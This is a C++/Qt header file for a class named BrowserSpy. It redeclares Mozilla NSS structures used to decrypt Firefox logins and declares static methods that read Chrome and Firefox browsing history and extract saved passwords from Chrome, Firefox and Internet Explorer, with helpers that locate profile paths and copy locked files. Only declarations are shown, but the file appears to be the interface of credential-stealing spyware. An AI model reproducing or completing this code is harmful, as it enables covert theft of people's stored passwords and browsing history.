#ifndef BROWSERSPY_H
#define BROWSERSPY_H

#include <QtCore/QObject>

typedef enum SECItemType
{
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
};

struct SECItem
{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
};


typedef enum SECStatus
{
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
};

#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0

class BrowserSpy
{
public:
    BrowserSpy();

    static QStringList readChromeUrls();
    static QStringList readFirefoxUrls();

    static QVariantList readChromePasswords();
    static QVariantList readFirefoxPasswords();
    static QVariantList readIEPasswords();

    static void addPasswordToList(QVariantList &list, const QString &browser,
                                  const QString &url,
                                  const QString &username, const QString &password);
private:
    static QString getChromePath();
    static QString getFirefoxPath();
    static QString getFirefoxLibPath();
    static bool copyFile(QString &file, bool rawCopy = false);
};

#endif // BROWSERSPY_H
